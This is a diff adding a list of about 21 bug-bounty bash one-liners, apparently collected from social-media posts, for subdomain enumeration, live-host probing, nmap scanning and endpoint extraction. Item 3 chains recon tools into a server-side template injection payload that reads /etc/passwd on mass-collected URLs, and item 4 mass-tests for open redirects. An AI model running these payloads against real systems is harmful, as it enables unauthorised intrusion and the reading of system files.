@@ -1,0 +1,130 @@
+1) Here is a onliner to convert massdns output to CSV 
+  
+  cat raw_subdomain.txt | sed 's/. A /~~/g; s/. CNAME /, CNAME ,/g; s/~~/, A ,/g' > livehost.csv
+
+2) #onliner to find (sub)domains related to a kword on pastebin through google #BugBounty
+
+http://google-search.py -t "site:http://pastebin.com kword" -b -d -s 0 -e 5 | sed "s/\.com\//\.com\/raw\//" | xargs curl -s | egrep -ho "[a-zA-Z0-9_\.\-]+kword[a-zA-Z0-9_\.\-]+" | sort -fu
+
+3) Bash oneliner get SSTI  
+@dwisiswant0
+
+
+echo "domain" | subfinder -silent |  waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep  "root:x"
+
+4) One-liner to get open-redirect
+
+> export LOCAL=http://localhost/; gau target | gf lfi | qsreplace "$LOCAL" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LOCAL" && echo "VULN! {}"'
+
+5) #oneliner #bugbountytips #bugbounty 
+* 
+@pdiscoveryio
+ FireFire
+Bash profile
+
+Reconx() {
+ subfinder -d $1 -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u
+}
+
+6) #oneliner #bugbountytips #bugbounty #bug
+* oneliner to find live host/domain/assets for target
+* 
+@pdiscoveryio
+ FireFireFire
+* subfinder -d http://tesla.com -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u
+
+7) #oneliner #recon #bugbountytips #bugbounty #bug
+A little update but stable
+@pdiscoveryio
+ FireFireFire
+```
+#!/bin/bash
+target=$(echo $1 | cut -d '.' -f1)
+wget -q https://chaos-data.projectdiscovery.io/$target.zip && unzip -q $target && cat $target*.txt | sort -u && rm -rf $target*
+```
+
+8) #oneliner #bugbountytips #bugbounty #bug
+* oneliner to resolve live host IP for target
+* 
+@pdiscoveryio
+ FireFireFire
+* subfinder -d http://tesla.com -silent | dnsprobe -silent | sort -u
+
+9) Curl + Parallels OneLiner (http_code + size + url)
+
+cat alive-subdomains.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
+.
+Get alive domain with multi-trading(get quick response).
+#bugbounty
+
+10) Simple Oneliner to Filter out Domains with "200 Status" and further digging:
+
+cat domains.txt | httpx -follow-redirects -status-code -vhost -threads 100 | sort -u | grep "200" | cut -d [ -f1 | tee output.txt
+
+11) [INFO] Curl + Parallels OneLiner (http_code + size + url)
+
+cat alive-subdomains.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
+#bugbounty #infosec  #recon 
+
+https://asciinema.org/a/4V7b4fojnDqVt6hrAub71ryNk
+
+
+12) I once got a 2k #BugBounty  for a simple `$(element).remove();`'esque jquery oneliner. Keep trying!
+
+13) Bash oneliner:
+- remove trailing characters/dots from large file 
+cat myfile | while read i; do echo "${i%.}"; done 
+- remove characters/dots from beginning of line
+cat myfile | while read i; do echo "${i#.}"; done 
+
+Replace the . with anything you want
+#BugBounty #bugbountytip
+
+14) Return a list of endpoints from a swagger.json.
+Pass them to your fuzzer(s), +profit?
+
+curl -s hxxps://petstore.swagger.io/v2/swagger.json | jq '.paths | keys[]'
+
+15) Perfect oneliner for subdomain enumeration
+
+curl -s 'https://crt.sh/?q=%.'<TARGET>'&output=json' | jq '.[] | .name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u
+
+ #bugbounty #bugbountytip #bugbountytips #infosec
+
+ 16) Oneliner to get all Http Titles (if they exist)
+
+for i in $(cat Webservers.txt ); do echo "$i | $(curl --connect-timeout 0.5 $i -so - | grep -iPo '(?<=<title>)(.*)(?=</title>)')"; done | tee -a titles.txt
+
+#bugbountytip #bugbounty #hackerone #bugcrowd
+
+17) Oneliner to get all status codes, size,url and redirect url with a ',' as a delimiter:
+
+cat webservers.txt | parallel -j50 -q curl -w 'Status:%{http_code},Size:%{size_download},%{url_effective},%{redirect_url}\n' -o /dev/null -sk
+
+18) Nmap oneliner to give you a clean list of host:port:version: #> mkdir nmap; cat targets.txt | parallel -j 35 nmap {} -sTVC -host-timeout 15m -oN nmap/{} -p 22,80,443,8080 --open > /dev/null 2>&1; cd nmap; grep -Hari "/tcp" | tee -a ../services.txt; cd ../ 
+
+19) oneliner waybackurls validator
+
+waybackurls http://bugcrowd.com | grep "url" | xargs -n 1 curl -s -o /dev/null -w "%{http_code} > %{url_effective}\n" | sort
+
+20) Mass cname checker oneliner.
+@ultimate1337
+
+
+$nano .bash_profile
+
+cname()
+{ for ip in $(cat $1);do dig asxf $ip | grep CNAME;done }
+
+$source .bash_profile
+$ cname subs.txt
+
+
+21) RT @renniepak: Pretty happy with this one-einer to extract endpoints from
+JavaScript fiees:
+cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&amp;]*\"" | sed -e 's/^"//' -e
+'s/"$//' | sort -u
+
+
+
+ 
